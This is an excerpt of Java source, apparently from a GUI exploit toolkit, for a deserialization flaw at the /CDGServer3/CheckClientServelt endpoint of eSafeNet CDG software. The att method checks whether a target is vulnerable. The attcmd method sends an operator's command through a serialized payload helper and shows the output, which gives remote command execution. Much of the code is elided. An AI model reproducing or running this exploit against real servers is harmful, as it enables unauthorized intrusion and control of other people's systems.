...
public class esafenet_CheckClientServelt_serial implements Exploitlnterface {
    @Override
    ...
    private Boolean att(String url, TextArea textArea) {
        try {
            ...
            Response post_res = HttpTools.get(url + "/CDGServer3/CheckClientServelt" , head, "utf-8");
            if (post_res.getCode() ==200 && post_res.getCode() != 0) {
                Platform.runLater(() -> {
//                    textArea.appendText("\n 漏洞存在 输入cmd开始构造回显");
                    textArea.appendText("\n [ esafenet_CheckClientServelt_serial ]");
    ...
    private Boolean attcmd(String url, String cmd, TextArea textArea,TextArea textArea_cmd) {
        ...
        try {
            String cmd_echo = Methods.esafenetSerial(url + "/CDGServer3/CheckClientServelt",cmd);
//
            if (cmd_echo != null) {
